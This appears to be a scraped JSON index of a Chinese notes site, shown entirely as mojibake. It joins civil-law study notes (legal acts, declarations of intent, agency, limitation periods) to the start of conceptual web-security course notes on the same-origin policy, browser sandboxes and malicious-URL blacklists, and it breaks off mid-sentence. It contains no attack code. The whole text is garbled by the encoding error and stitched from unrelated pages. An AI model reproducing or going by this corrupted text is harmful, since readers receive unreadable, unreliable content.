æ³•å¾‹è¡Œä¸ºï¼šåˆç§°æ°‘äº‹è¡Œä¸ºï¼Œæ˜¯æŒ‡æ°‘äº‹ä¸»ä½“å®æ–½çš„ä»¥å‘ç”Ÿæ°‘äº‹æ³•å¾‹åæœä¸ºç›®çš„ã€ä»¥æ„æ€è¡¨ç¤ºä¸ºè¦ç´ çš„è¡Œä¸ºã€‚ æ³•å¾‹è¡Œä¸ºçš„åˆ†ç±»  æ„æ€è¡¨ç¤ºçŠ¶å†µï¼šåŒæ–¹è¡Œä¸ºã€å•æ–¹è¡Œä¸ºå’Œå¤šæ–¹è¡Œä¸ºã€‚ ä¾æ®æ³•å¾‹æ˜¯å¦é¡»ä¾æ³•å¾‹è§„å®šçš„ç‰¹å®šæ–¹å¼ä¸ºä¹‹ï¼šè¦å¼è¡Œä¸ºã€ä¸è¦å¼è¡Œä¸ºã€‚ ä¾æ®æ³•å¾‹è¡Œä¸ºçš„æˆç«‹é™¤æ„æ€è¡¨ç¤ºå¤–ï¼Œæ˜¯å¦ä»¥æ ‡çš„ç‰©çš„å®é™…äº¤ä»˜ä¸ºè¦ä»¶ï¼šè¦ç‰©è¡Œä¸ºã€ä¸è¦ç‰©è¡Œä¸ºã€‚ å‘ç”Ÿæ•ˆåŠ›æ—¶é—´ï¼šç”Ÿå‰è¡Œä¸ºã€æ­»å› è¡Œä¸ºã€‚ æ³•å¾‹åæœæ€§è´¨ï¼šè´¢äº§è¡Œä¸ºã€èº«ä»½è¡Œä¸ºã€‚ è´¢äº§è¡Œä¸ºæ•ˆæœçš„ä¸åŒï¼šè´Ÿæ‹…è¡Œä¸ºã€å¤„åˆ†è¡Œä¸ºã€‚ æ³•å¾‹è¡Œä¸ºå†…å®¹çš„ä¸åŒï¼šå€ºæƒè¡Œä¸ºã€ç‰©æƒè¡Œä¸ºã€‚ æ³•å¾‹è¡Œä¸ºæ˜¯å¦æœ‰å¯¹ä»·ï¼šæœ‰å¿è¡Œä¸ºã€æ— å¿è¡Œä¸ºã€‚ è¡Œä¸ºä¹‹é—´çš„å…³ç³»ï¼šä¸»è¡Œä¸ºã€ä»è¡Œä¸ºã€‚ æ³•å¾‹è¡Œä¸ºæ˜¯ç‹—æœ‰ç‹¬ç«‹çš„å®è´¨å†…å®¹ï¼šç‹¬ç«‹è¡Œä¸ºã€è¡¥åŠ©è¡Œä¸ºã€‚ è¡Œä¸ºå’ŒåŸå› ä¹‹é—´çš„å…³ç³»ï¼šæœ‰å› è¡Œä¸ºã€æ— å› è¡Œä¸ºã€‚    ç¬¬3èŠ‚ æ³•å¾‹è¡Œä¸ºçš„è¦ä»¶ #   æ³•å¾‹è¡Œä¸ºçš„æˆç«‹è¦ä»¶ï¼šåŒ…æ‹¬ä¸€èˆ¬æˆç«‹æ¡ä»¶å’Œç‰¹åˆ«æˆç«‹æ¡ä»¶  ä¸€èˆ¬æˆç«‹æ¡ä»¶ï¼šä»»ä½•æ³•å¾‹è¡Œä¸ºæˆç«‹éƒ½å¿…ä¸å¯å°‘çš„å…±åŒè¦ä»¶ã€‚åŒ…æ‹¬ï¼š  é¡»æœ‰è¡Œä¸ºäºº é¡»æœ‰æ„æ€è¡¨ç¤ºã€‚æ„æ€+è¡¨ç¤º é¡»æœ‰æ ‡çš„ã€‚æ ‡çš„å³è¡¨ç¤ºçš„å†…å®¹ï¼Œæ˜¯è¡Œä¸ºäººå®æ–½æ³•å¾‹è¡Œä¸ºæ‰€è¦è¾¾åˆ°çš„æ•ˆæœã€‚   ç‰¹åˆ«æˆç«‹æ¡ä»¶ï¼ŒæŒ‡ä¸€äº›ç‰¹åˆ«çš„æ³•å¾‹è¡Œä¸ºæˆç«‹æ‰€é¡»å…·å¤‡çš„ç‰¹æ®Šæ¡ä»¶ã€‚   æ³•å¾‹è¡Œä¸ºçš„ç”Ÿæ•ˆè¦ä»¶ï¼ŒåŒ…æ‹¬ä¸€èˆ¬ç”Ÿæ•ˆè¦ä»¶å’Œç‰¹åˆ«ç”Ÿæ•ˆè¦ä»¶  ä¸€èˆ¬ç”Ÿæ•ˆè¦ä»¶ï¼š  è¡Œä¸ºäººå…·æœ‰ç›¸åº”çš„æ°‘äº‹è¡Œä¸ºèƒ½åŠ›ï¼› æ„æ€è¡¨ç¤ºçœŸå®ï¼› æ ‡çš„é¡»åˆæ³•ï¼› æ ‡çš„é¡»å¯èƒ½å’Œç¡®å®šã€‚   ç‰¹åˆ«ç”Ÿæ•ˆè¦ä»¶ï¼Œæ˜¯æŒ‡ä¸€äº›ç‰¹æ®Šçš„æ³•å¾‹è¡Œä¸ºé™¤å…·å¤‡ä¸€èˆ¬ç”Ÿæ•ˆè¦ä»¶å¤–ï¼Œè¿˜é¡»å…·å¤‡çš„ç”Ÿæ•ˆè¦ä»¶ã€‚   æ³•å¾‹è¡Œä¸ºçš„æ ‡çš„ï¼šæ˜¯æŒ‡æ³•å¾‹è¡Œä¸ºçš„å†…å®¹ã€‚æ³•å¾‹è¡Œä¸ºçš„æˆç«‹ï¼Œä»¥æœ‰æ ‡çš„ä¸ºæˆç«‹è¦ä»¶ã€‚åŒ…æ‹¬ï¼š  æ ‡çš„åˆæ³•ï¼Œæ˜¯æŒ‡ä¸è¿åæ³•å¾‹å¼ºè¡Œæ€§è§„å®šåŠå…¬åºè‰¯ä¿—ã€‚ æ ‡çš„ç¡®å®šï¼Œæ˜¯æŒ‡æ ‡çš„é¡»è‡ªå§‹ç¡®å®šã€‚å¦åˆ™æ— æ•ˆã€‚    ç¬¬4èŠ‚ æ„æ€è¡¨ç¤º #   æ„æ€è¡¨ç¤ºï¼šæŒ‡å‘å¤–éƒ¨è¡¨æ˜æ„æ¬²å‘ç”Ÿä¸€å®šç§æ³•ä¸Šçš„æ³•å¾‹æ•ˆæœä¹‹æ„æ€çš„è¡Œä¸ºã€‚ æ„æ€è¡¨ç¤ºçš„æ„æˆè¦ç´ ï¼šæ•ˆæœæ„æ€ã€è¡¨ç¤ºæ„æ€å’Œè¡¨ç¤ºè¡Œä¸ºã€‚  æ•ˆæœæ„æ€ï¼šæŒ‡è¡¨ç¤ºä¸Šçš„æ•ˆæœæ„æ€ï¼Œå³ä»ä¹¦é¢å½¢å¼æˆ–å£å¤´å½¢å¼çš„è¡¨ç¤ºè¡Œä¸ºæ‰€æ¨æ–­å‡ºçš„æ•ˆæœæ„æ€ã€‚ è¡¨ç¤ºè¡Œä¸ºï¼šæŒ‡ä»¥ä¹¦é¢å½¢å¼æˆ–å£å¤´å½¢å¼å°†æ„æ€å¤–éƒ¨åŒ–çš„è¡Œä¸ºã€‚    ç¬¬5èŠ‚ æ„æ€ä¸è¡¨ç¤ºä¸ä¸€è‡´ #   æ•…æ„çš„ä¸ä¸€è‡´  çœŸæ„ä¿ç•™ï¼šæŒ‡è¡¨æ„äººæ•…æ„éšåŒ¿å…¶çœŸæ„ï¼Œè€Œè¡¨ç¤ºä¸å…¶çœŸæ„ä¸åŒä¹‹æ„æ€çš„æ„æ€è¡¨ç¤ºã€‚  é¡»æœ‰æ„æ€è¡¨ç¤º é¡»è¡¨ç¤ºä¸çœŸæ„ä¸ç¬¦ é¡»è¡¨æ„äººæ˜çŸ¥å…¶è¡¨ç¤ºä¸çœŸæ„ä¸ç¬¦   çœŸæ„ä¿ç•™åŸåˆ™ä¸Šæœ‰æ•ˆï¼Œä½†å…¶ä¸ä¸€è‡´ä¸ºç›¸å¯¹äººæ‰€æ˜çŸ¥è€…ï¼Œåº”æ— æ•ˆã€‚   è™šä¼ªè¡¨ç¤ºï¼šæŒ‡è¡¨æ„äººä¸ç›¸å¯¹äººé€šè°‹è€Œä¸ºä¹‹è™šå‡çš„æ„æ€è¡¨ç¤ºã€‚  é¡»æœ‰æ„æ€è¡¨ç¤º é¡»è¡¨ç¤ºä¸çœŸæ„ä¸ç¬¦ é¡»è¡¨æ„äººä¸ç›¸å¯¹äººé€šè°‹   è™šä¼ªè¡¨ç¤ºåŸåˆ™ä¸Šæ— æ•ˆï¼Œä½†ä¸å¾—ä»¥å…¶æ— æ•ˆå¯¹æŠ—å–„æ„ç¬¬ä¸‰äººã€‚   éšè—è¡Œä¸º:æŒ‡éšè—äºè™šä¼ªè¡¨ç¤ºä¸­ä¾å…¶çœŸæ„æ‰€æ¬²å‘ç”Ÿçš„æ³•å¾‹è¡Œä¸ºã€‚ è„±æ³•è¡Œä¸º:æŒ‡ä»¥è¿‚å›æ‰‹æ®µè§„é¿å¼ºè¡Œè§„å®šä¹‹è¡Œä¸ºã€‚   æ— æ„çš„ä¸ä¸€è‡´  é”™è¯¯:æŒ‡è¡¨æ„äººå› è¯¯è®¤æˆ–ä¸çŸ¥ï¼Œè‡´å…¶æ„æ€ä¸è¡¨ç¤ºä¸ä¸€è‡´ã€‚  é”™è¯¯çš„æ„ä¹‰:  é¡»è¡¨ç¤ºä¸æ„æ€ä¸ä¸€è‡´ é¡»å…¶ä¸ä¸€è‡´å‡ºäºè¡¨æ„äººä¹‹è¯¯è®¤æˆ–ä¸çŸ¥   é”™è¯¯çš„åˆ†ç±»  å…³äºå½“äº‹äººæœ¬èº«çš„é”™è¯¯ å…³äºæ ‡çš„ç‰©æœ¬èº«ä¹‹é”™è¯¯ å…³äºå½“äº‹äººèµ„æ ¼ä¹‹é”™è¯¯ å…³äºæ ‡çš„ç‰©æ€§è´¨ä¹‹é”™è¯¯ å…³äºæ³•å¾‹è¡Œä¸ºæ€§è´¨ä¹‹é”™è¯¯ å…³äºä»·æ ¼ã€æ•°é‡ã€å±¥è¡Œåœ°ã€å±¥è¡ŒæœŸä¹‹é”™è¯¯ å…³äºåŠ¨æœºä¹‹é”™è¯¯   é”™è¯¯çš„æ•ˆåŠ›:æ—¥æœ¬æ°‘æ³•è§„å®šä¸ºæ— æ•ˆï¼›å¾·å›½ã€å°æ¹¾æ°‘æ³•è§„å®šä¸ºå¯æ’¤é”€ã€‚   è¯¯ä¼ :æŒ‡å› ä¼ è¾¾äººæˆ–ä¼ è¾¾æœºå…³ä¹‹é”™è¯¯è‡´è¡¨ç¤ºä¸æ„æ€ä¸ç¬¦ã€‚ä¼ è¾¾äººå’Œä¼ è¾¾æœºå…³åœ¨æ³•å¾‹ä¸Šç›¸å½“äºè¡¨æ„äººä¹‹å–‰èˆŒï¼Œå› æ­¤è¯¯ä¼ ä¹‹æ•ˆåŠ›ä¸é”™è¯¯åŒã€‚   èƒè¿«:æŒ‡ä»¥ä¸æ³•åŠ å®³å¨èƒä»–äººï¼Œä½¿å…¶äº§ç”Ÿææƒ§å¿ƒç†ï¼Œå¹¶åŸºäºææƒ§å¿ƒç†è€Œä¸ºæ„æ€è¡¨ç¤ºä¹‹è¡Œä¸ºã€‚  èƒè¿«çš„æ„æˆè¦ä»¶  é¡»æœ‰èƒè¿«ä¹‹æ•…æ„ é¡»æœ‰èƒè¿«è¡Œä¸º é¡»å…¶èƒè¿«ä¸ºéæ³• é¡»è¢«èƒè¿«äººå› å—èƒè¿«è€Œç”Ÿææƒ§å¿ƒç† é¡»è¢«èƒè¿«äººåŸºäºææƒ§å¿ƒç†è€Œä¸ºæ„æ€è¡¨ç¤º   èƒè¿«çš„æ•ˆåŠ›:ä¸è®ºèƒè¿«äººæ˜¯å¦ä¸ºå¯¹æ–¹å½“äº‹äººï¼Œè¡¨æ„äººå‡å¾—æ’¤é”€å…¶æ„æ€è¡¨ç¤ºï¼Œå¹¶ä¸”æ­¤æ’¤é”€å¾—å¯¹æŠ—å–„æ„ç¬¬ä¸‰äººã€‚    ç¬¬7ç«  ä»£ç† #  ç¬¬1èŠ‚ ä»£ç†çš„æ¦‚å¿µ #   ä»£ç†ï¼šæŒ‡ä¸€äººä»£å¦ä¸€äººä¸ºæ³•å¾‹è¡Œä¸ºï¼Œå…¶æ‰€äº§ç”Ÿçš„æ³•å¾‹æ•ˆæœç›´æ¥å½’å±æ‰€å¸¦çš„å¦ä¸€ä¸ªäººã€‚ ç‹­ä¹‰ä»£ç†ï¼šæŒ‡ä»£ç†äººä»¥æœ¬äººåä¹‰ä¸ºæ³•å¾‹è¡Œä¸ºï¼Œè€Œä½¿å…¶æ³•å¾‹æ•ˆæœç›´æ¥å½’å±äºæœ¬äººã€‚ å¹¿ä¹‰ä»£ç†ï¼šä»£ç†äººä»¥æœ¬äººåä¹‰æˆ–ä»¥è‡ªå·±åä¹‰ï¼Œä»£æœ¬äººä¸ºæ³•å¾‹è¡Œä¸ºï¼Œè€Œä½¿æ‰€äº§ç”Ÿçš„æ³•å¾‹æ•ˆæœç›´æ¥æˆ–é—´æ¥å½’å±äºæœ¬äººã€‚  ç¬¬2èŠ‚ ä»£ç†å…³ç³» #   æœ¬äººï¼šæŒ‡å€ŸåŠ©äºä»£ç†äººçš„ä»£ç†è¡Œä¸ºåŒç›¸å¯¹äººå‘ç”Ÿæ°‘äº‹æ³•å¾‹å…³ç³»çš„äººã€‚ ä»£ç†äººï¼šæŒ‡ä»£æœ¬äººå®æ–½æ°‘äº‹æ³•å¾‹è¡Œä¸ºçš„äººã€‚ ç›¸å¯¹äººï¼šæŒ‡ç”±ä»£ç†äººçš„ä»£ç†è¡Œä¸ºè€Œä¸æœ¬äººå‘ç”Ÿæ°‘äº‹æ³•å¾‹å…³ç³»çš„å¯¹æ–¹å½“äº‹äººã€‚  ç¬¬5èŠ‚ ä»£ç†è¡Œä¸º #   ä»£ç†è¡Œä¸ºçš„æˆç«‹è¦ä»¶  ä¸€èˆ¬æˆç«‹è¦ä»¶ ç‰¹æ®Šæˆç«‹è¦ä»¶  æ˜¯å¦ä»¥æœ¬äººåä¹‰ é¡»ä»£ç†äººå®æ–½æ°‘äº‹æ³•å¾‹è¡Œä¸º     ä»£ç†è¡Œä¸ºçš„ç”Ÿæ•ˆè¦ä»¶  é¡»å…·å¤‡ä¸€èˆ¬æ°‘äº‹çš„ç”Ÿæ•ˆè¦ä»¶  å…³äºæƒåˆ©èƒ½åŠ›ä¹‹æœ‰æ— ï¼Œåº”å°±æœ¬äººå†³å®šä¹‹ã€‚ å…³äºè¡Œä¸ºèƒ½åŠ›ä¹‹æœ‰æ— ï¼Œåº”å°±ä»£ç†äººå†³å®šä¹‹ã€‚ å…³äºæ„æ€è¡¨ç¤ºä¹‹æ˜¯å¦çœŸå®ï¼Œæ˜¯å¦æœ‰ç‘•ç–µï¼Œåº”å°±ä»£ç†äººå†³å®šä¹‹ã€‚ å…³äºè¡Œä¸ºå†…å®¹å’Œç›®çš„æ˜¯å¦è¿æ³•ï¼Œåº”å°±ä»£ç†äººä¸æœ¬äººåŒæ–¹å†³å®šä¹‹ã€‚åªè¦å…¶ä¸­ä¸€æ–¹æœ‰è¿æ³•ç›®çš„ï¼Œä»£ç†è¡Œä¸ºå³åº”æ— æ•ˆã€‚   é¡»æœ‰æœ¬äººå­˜åœ¨ é¡»æœ‰ä»£ç†æƒ    ç¬¬8ç«  è¯‰è®¼æ—¶æ•ˆ #  ç¬¬1èŠ‚ æ—¶æ•ˆçš„æ¦‚å¿µ #   æ—¶æ•ˆï¼ŒæŒ‡ä¸€å®šäº‹å®çŠ¶æ€åœ¨æ³•å®šæœŸé—´æŒç»­å­˜åœ¨ï¼Œä»è€Œäº§ç”Ÿä¸è¯¥äº‹å®çŠ¶æ€ç›¸é€‚åº”çš„æ³•å¾‹æ•ˆæœçš„æ³•å¾‹åˆ¶åº¦ã€‚æ°‘æ³•å…³äºæ—¶æ•ˆçš„è§„å®šï¼Œå±äºå¼ºè¡Œæ€§è§„å®šï¼Œæ„æˆæ°‘äº‹æƒåˆ©çš„é™åˆ¶ã€‚ æ—¶æ•ˆåˆ¶åº¦çš„é‡å¤§åŠŸèƒ½  ç¨³å®šæ³•å¾‹ç§©åº ä½œä¸ºè¯æ®ä¹‹ä»£ç”¨ ä¿ƒä½¿æƒåˆ©äººè¡Œä½¿æƒåˆ©    ç¬¬4èŠ‚ è¯‰è®¼æ—¶æ•ˆçš„æœŸé—´ #   æ°‘æ³•é€šåˆ™è§„å®šäº†ä¸‰ç§æ—¶æ•ˆæœŸé—´ï¼Œå³æ™®é€šæ—¶æ•ˆæœŸé—´ä¸º2å¹´ï¼Œç‰¹åˆ«æ—¶æ•ˆæœŸé—´ä¸º1å¹´ï¼Œæœ€é•¿æ—¶æ•ˆæœŸé—´ä¸º20å¹´ã€‚ è¯‰è®¼æ—¶æ•ˆæœŸé—´çš„ä¸­æ­¢:æŒ‡åœ¨æ—¶æ•ˆæœŸé—´è¡Œå°†å®Œæˆä¹‹é™…ï¼Œæœ‰ä¸æƒåˆ©äººæ— å…³çš„äº‹ç”±è€Œä½¿æƒåˆ©äººæ— æ³•è¡Œä½¿å…¶è¯·æ±‚æƒï¼Œæ³•å¾‹ä¸ºä¿æŠ¤æƒåˆ©äººè€Œä½¿æ—¶æ•ˆæœŸé—´æš‚åœè®¡ç®—ï¼Œå¾…ä¸­æ­¢äº‹ç”±æ¶ˆç­åç»§ç»­è®¡ç®—ã€‚  æ—¶æ•ˆæœŸé—´ä¸­æ­¢çš„æ¡ä»¶  æœ‰æƒåˆ©äººä¸èƒ½è¡Œä½¿å…¶è¯·æ±‚æƒçš„éšœç¢ï¼ŒåŒ…æ‹¬ä¸å¯æŠ—åŠ›åŠå…¶ä»–éšœç¢ã€‚ æ­¤éšœç¢å‘ç”Ÿåœ¨2å¹´çš„æ™®é€šæ—¶æ•ˆæœŸé—´æˆ–1å¹´çš„ç‰¹åˆ«æ—¶æ•ˆæœŸé—´çš„æœ€å6ä¸ªæœˆå†…ã€‚     è¯‰è®¼æ—¶æ•ˆæœŸé—´çš„ä¸­æ–­:ä¸­æ–­ï¼ŒæŒ‡åœ¨æœ‰æ³•å®šäº‹ç”±å‘ç”Ÿæ—¶ï¼Œæ­¤å‰å·²è®¡ç®—çš„æ—¶æ•ˆæœŸé—´å…¨å½’æ— æ•ˆï¼Œå¾…ä¸­æ–­äº‹ç”±æ¶ˆç­åæ—¶æ•ˆæœŸé—´é‡æ–°è®¡ç®—ã€‚  æ—¶æ•ˆæœŸé—´ä¸­æ–­çš„æ³•å®šäº‹ç”±  èµ·è¯‰ ä»¥å…¶ä»–æ–¹å¼ä¸»å¼ æƒåˆ© ä¹‰åŠ¡äººåŒæ„å±¥è¡Œä¹‰åŠ¡     ä¸­æ–­ä¸ä¸­æ­¢çš„åŒºåˆ«ï¼š  å‘ç”Ÿä¸­æ­¢çš„åŸå› å±äºä¸å½“äº‹äººæ— å…³çš„å®¢è§‚æƒ…å†µï¼Œè€Œå‘ç”Ÿä¸­æ–­çš„åŸå› ç³»å½“äº‹äººçš„è¡Œä¸ºï¼Œäº¦å³å–å†³äºå½“äº‹äººçš„æ„æ€ã€‚ åœ¨æ—¶æ•ˆæœŸé—´ä¸­æ­¢ï¼Œä¸­æ­¢ä»¥å‰å·²ç»è¿›è¡Œçš„æ—¶æ•ˆæœŸé—´ä¸ºæœ‰æ•ˆï¼Œåº”ä¸ä¸­æ­¢åŸå› æ¶ˆç­åç»§ç»­è®¡ç®—çš„æ—¶æ•ˆæœŸé—´åˆå¹¶è®¡ç®—ï¼›åœ¨æ—¶æ•ˆæœŸé—´ä¸­æ–­ï¼Œä¸­æ–­ä»¥å‰å·²ç»è¿›è¡Œçš„æ—¶æ•ˆæœŸé—´ä¸ºæ— æ•ˆï¼Œä¸­æ–­åŸå› æ¶ˆç­åé‡æ–°è®¡ç®—æ—¶æ•ˆæœŸé—´ã€‚ åœ¨æ—¶æ•ˆæœŸé—´ä¸­æ­¢ï¼Œä¸­æ­¢åŸå› åº”å‘ç”Ÿåœ¨æ—¶æ•ˆæœŸé—´çš„æœ€å6ä¸ªæœˆå†…ï¼Œæ‰èƒ½å‘ç”Ÿä¸­æ­¢çš„æ•ˆåŠ›ï¼›åœ¨æ—¶æ•ˆæœŸé—´ä¸­æ–­ï¼Œä¸­æ–­åŸå› æ— è®ºå‘ç”Ÿåœ¨æ—¶æ•ˆæœŸé—´çš„å“ªä¸€æ®µï¼Œå‡åº”å‘ç”Ÿä¸­æ–­çš„æ•ˆåŠ›ã€‚    "},{"id":340,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/1.%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8/1.%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8/","title":"1.æµè§ˆå™¨å®‰å…¨","section":"1.å®¢æˆ·ç«¯å®‰å…¨","content":"æµè§ˆå™¨å®‰å…¨ #  åŒæºç­–ç•¥ #  ä»€ä¹ˆæ˜¯åŒæºç­–ç•¥ï¼ˆSame Origin Policyï¼‰ï¼Ÿ\n æµè§ˆå™¨çš„åŒæºç­–ç•¥ï¼Œé™åˆ¶äº†æ¥è‡ªä¸åŒæºçš„ document æˆ–è„šæœ¬ä¹‹é—´çš„è¯»å–è®¿é—®ã€‚  æºçš„å› ç´ æœ‰å¾ˆå¤šç§ï¼šåŸŸåä¸å­åŸŸåã€IP åœ°å€ã€ç«¯å£ã€åè®®ã€‚\nsrc å±æ€§èµ„æºæ–‡ä»¶çš„åŠ è½½ï¼š\n  éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå­˜æ”¾ JS æ–‡ä»¶çš„åŸŸå¹¶ä¸é‡è¦ï¼›é‡è¦çš„æ˜¯ JS æ–‡ä»¶åŠ è½½çš„åŸŸã€‚\n  åœ¨æµè§ˆå™¨ä¸­ \u0026lt;script\u0026gt;ã€\u0026lt;img\u0026gt;ã€\u0026lt;iframe\u0026gt;ã€\u0026lt;link\u0026gt; ç­‰æ ‡ç­¾éƒ½å¯ä»¥è¢«è·¨åŸŸåŠ è½½èµ„æºï¼Œè€Œä¸å—åŒæºç­–ç•¥çš„é™åˆ¶ã€‚\n  è¿™äº›å¸¦ src å±æ€§çš„æ ‡ç­¾æ¯æ¬¡åŠ è½½æ—¶ï¼Œå®é™…ä¸Šæ˜¯ç”±æµè§ˆå™¨å‘èµ·äº†ä¸€æ¬¡ GET è¯·æ±‚ã€‚\n  ä¸åŒäº XMLHttpRequest çš„æ˜¯ï¼šé€šè¿‡ src å±æ€§åŠ è½½çš„èµ„æºï¼Œæµè§ˆå™¨é™åˆ¶äº†å…¶æƒé™ï¼ˆä¸èƒ½è¯»å†™è¿”å›çš„å†…å®¹ï¼‰ã€‚\n  XMLHttpRequest è¯·æ±‚ï¼š\n  å¦‚æœ XMLHttpRequest èƒ½å¤Ÿè·¨åŸŸè®¿é—®èµ„æºï¼Œåˆ™å¯èƒ½ä¼šå¯¼è‡´ä¸€äº›æ•æ„Ÿèµ„æºçš„æ³„éœ²ã€‚æ¯”å¦‚ï¼šCSRF çš„ tokenï¼Œä»è€Œå¯¼è‡´å‘ç”Ÿå®‰å…¨é—®é¢˜ã€‚\n  éšç€ä¸šåŠ¡çš„å‘å±•ï¼ŒW3C å§”å‘˜ä¼šåˆ¶å®šäº† XMLHttpRequest è·¨åŸŸè®¿é—®æ ‡å‡†ï¼šå®ƒéœ€è¦é€šè¿‡ç›®æ ‡åŸŸè¿”å›çš„ HTTP å¤´æ¥æˆæƒæ˜¯å¦å…è®¸è·¨åŸŸè®¿é—®ã€‚\nå®‰å…¨æ€§åŸºäºï¼šå› ä¸º HTTP è¯·æ±‚å¤´ä¸€èˆ¬æ˜¯æ— æ³•è¢« JS æ§åˆ¶çš„ï¼Œæ‰€ä»¥è®¤ä¸ºè¿™ä¸ªæ–¹æ¡ˆæ˜¯å¯ä»¥å®æ–½çš„ã€‚\n  å¯¹äºæµè§ˆå™¨æ¥è¯´ï¼Œé™¤äº† DOMã€Cookieã€XMLHttpRequest ä¼šå—åˆ°åŒæºç­–ç•¥çš„é™åˆ¶å¤–ï¼Œæµè§ˆå™¨åŠ è½½çš„ä¸€äº›ç¬¬ä¸‰æ–¹æ’ä»¶ä¹Ÿæœ‰å„è‡ªçš„åŒæºç­–ç•¥ã€‚æœ€å¸¸è§çš„æ¯”å¦‚ï¼šFlashã€Java Appletã€Silverlightã€Google Gears ç­‰éƒ½æœ‰è‡ªå·±åŒæºç­–ç•¥ã€‚\næµè§ˆå™¨æ²™ç®± #  é»‘å®¢åœˆå­åè¯ æŒ‚é©¬ï¼š\n åœ¨ç½‘é¡µä¸­æ’å…¥ä¸€æ®µæ¶æ„ä»£ç ï¼Œåˆ©ç”¨æµè§ˆå™¨æ¼æ´æ‰§è¡Œä»»æ„ä»£ç çš„æ”»å‡»æ–¹å¼ã€‚  æµè§ˆå™¨çš„å¤šè¿›ç¨‹æ¶æ„ï¼Œå°†æµè§ˆå™¨çš„å„ä¸ªåŠŸèƒ½æ¨¡å—åˆ†å¼€ï¼Œå„ä¸ªæµè§ˆå™¨å®ä¾‹åˆ†å¼€ï¼Œå½“ä¸€ä¸ªè¿›ç¨‹å´©æºƒæ—¶ï¼Œä¹Ÿä¸ä¼šå½±å“åˆ°å…¶ä»–çš„è¿›ç¨‹ã€‚\nGoogle-Chrome æ˜¯ç¬¬ä¸€ä¸ªé‡‡å–å¤šè¿›ç¨‹æ¶æ„çš„æµè§ˆå™¨ã€‚å®ƒçš„ä¸»è¦è¿›ç¨‹åˆ†æœ‰ï¼š\n æµè§ˆå™¨è¿›ç¨‹ã€æ¸²æŸ“è¿›ç¨‹ã€æ’ä»¶è¿›ç¨‹ï¼ˆå¦‚ pdfã€javaã€flashï¼‰ã€æ‰©å±•è¿›ç¨‹ã€‚  æ²™ç®±çš„åº”ç”¨èŒƒå›´éå¸¸å¹¿æ³›ã€‚è€Œå¯¹äºæµè§ˆå™¨æ¥è¯´ï¼Œé‡‡ç”¨ SandBox æŠ€æœ¯è®©ä¸å—ä¿¡ä»»çš„ç½‘é¡µä»£ç è¿è¡Œåœ¨ä¸€ä¸ªå—åˆ°é™åˆ¶çš„ç¯å¢ƒä¸­ï¼Œä»è€Œä¿æŠ¤æœ¬åœ°æ¡Œé¢ç³»ç»Ÿçš„å®‰å…¨ã€‚\nGoogle-Chrome å®ç°äº†ä¸€ä¸ªç›¸å¯¹å®Œæ•´çš„æ²™ç®±ï¼ˆå®˜ç½‘ï¼‰ï¼š\næ¶æ„ç½‘å€æ‹¦æˆª #  æµè§ˆå™¨æ‹¦æˆªæ¶æ„ç½‘å€çš„åŠŸèƒ½éƒ½æ˜¯åŸºäº â€é»‘åå•â€œ çš„ï¼Œå¦‚æœç”¨æˆ·ä¸Šç½‘æ—¶å‘ä¿¡å•Šç½‘å€å­˜åœ¨äºé»‘åå•ä¸­ï¼Œæµè§ˆå™¨ä¼šå¼¹å‡ºä¸€ä¸ª è­¦å‘Šé¡µé¢ã€‚\nå¸¸è§çš„æ¶æ„ç½‘å€åˆ†ä¸ºä¸¤ç±»ï¼š\n æŒ‚é©¬ç½‘ç«™ï¼Œè¿™äº›ç½‘ç«™é€šå¸¸åŒ…å«æœ‰æ¶æ„çš„è„šæœ¬æ¯”å¦‚ Flash æˆ– JavaScriptï¼Œé€šè¿‡åˆ©ç”¨æµè§ˆå™¨çš„æ¼æ´æ‰§è¡Œ shellcode æ’å…¥æœ¨é©¬ï¼› é’“é±¼ç½‘ç«™ï¼Œé€šè¿‡æ¨¡ä»¿çŸ¥åç½‘ç«™çš„ç›¸ä¼¼é¡µé¢æ¥æ¬ºéª—ç”¨æˆ·ã€‚  è¦è¯†åˆ«æ¶æ„ç½‘ç«™å»ºç«‹é»‘åå•ï¼š\n  éœ€è¦è®¸å¤šåŸºäºé¡µé¢çš„ç‰¹å¾ï¼Œè€Œè¿™äº›æ¨¡å‹æ˜¾ç„¶æ˜¯ä¸é€‚åˆæ”¾åœ¨å®¢æˆ·ç«¯çš„ã€‚æ”»å‡»è€…ä¼šåˆ†æç ”ç©¶å¹¶ç»•è¿‡è¿™äº›è§„åˆ™ï¼Œè€Œä¸”æ”¶é›†ç”¨æˆ·è®¿é—®çš„å†å²çºªå½•ä¹Ÿæ˜¯ä¸€ç§ä¾µçŠ¯éšç§çš„è¡Œä¸ºã€‚\n  ä¸€äº›æœ‰å®åŠ›çš„æµè§ˆå™¨å‚å•†ä¼šè‡ªå»ºæœ‰å®‰å…¨å›¢é˜Ÿå¯¹æ¶æ„ç½‘å€è¿›è¡Œè¯†åˆ«ï¼Œè¿™ä»½é»‘åå•å¯¹äºæœç´¢å¼•æ“æ¥è¯´ä¹Ÿæ˜¯å…¶æ ¸å¿ƒç«äº‰åŠ›ä¹‹ä¸€ã€‚\n  PhishTank æ˜¯äº’è”ç½‘ä¸Šå…è´¹çš„æä¾›æ¶æ„ç½‘å€é»‘åå•çš„ç»„ç»‡ä¹‹ä¸€ï¼Œå®ƒç”±ä¸–ç•Œå„åœ°çš„å¿—æ„¿è€…æä¾›ã€‚\n  Google ä¹Ÿå…¬å¼€äº† SafeBrowsing APIï¼Œä»»ä½•ç»„ç»‡æˆ–ä¸ªäººéƒ½å¯ä»¥åœ¨äº§å“ä¸­æ¥å…¥ã€‚\n  é™¤æ­¤ä¹‹å¤–ï¼ŒEV SSL è¯ä¹¦ï¼ˆExtended Validation SSL Certificateï¼‰å¯ä»¥è¿›è¡Œç™½åå•æ 